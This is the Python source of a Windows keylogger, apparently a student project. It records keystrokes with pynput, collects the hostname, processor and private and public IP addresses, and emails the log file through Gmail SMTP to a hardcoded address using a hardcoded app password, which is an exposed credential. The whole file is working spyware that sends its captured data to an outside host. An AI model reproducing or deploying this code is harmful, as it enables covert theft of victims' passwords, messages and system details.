import pynput

from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#variable declaration for email
email_address = "keyclog@gmail.com"
password = "zplhvxysqwztdygc"
to_addr = "keyclog@gmail.com"

# variable declaration for keylog
key_log = "log.txt"
file_path = "C:\\Users\\casey\\Documents\\comp sci\\keylogger" 
extend = "\\"


# variable declarations for system info
system_info = "system.txt"

# variable declarations for keylog
# count to check if key is pressed then written to, keys to hold the keys
count = 0
keys = []

# sending email functionality 
def send_email(filename, attachment, toaddr):
    from_addr = email_address
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "Logs"
    body = "Body of Mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" %filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    # creating a secure session to send email
    s.starttls()
    s.login(from_addr, password)
    text = msg.as_string()
    s.sendmail(from_addr, to_addr, text)
    # end the session
    s.quit()

send_email(key_log, file_path + extend + key_log, to_addr)

# grabbing computer information function
def comp_info():
    with open(file_path + extend + system_info ,"a") as file:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        # grabbing public ip address
        try:
            public_ip = get("https://api.ipify.org").text
            file.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            file.write("Public IP Address not found")

        file.write("Processor: " + (platform.processor()) + "\n")
        file.write("System: " + platform.system() + " " + platform.version() + "\n") 
        file.write("Machine: " + platform.machine() + "\n")
        file.write("Hostname: " + hostname + "\n")
        file.write("Private IP Address: " + ip_addr)

comp_info()

# basic key logger functionality
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            # getting rid of ' from the string
            k = str(key).replace("'", "")
            # getting rid of spaces
            if k.find("space") > 0:
                file.write('\n')
            elif k.find("Key") == -1:
                file.write(k)

def on_release(key):
    if key == Key.esc:
        return False

## on_press = key is press on_release = key is released
with Listener(on_press=on_press, on_release = on_release) as listener:
    listener.join()
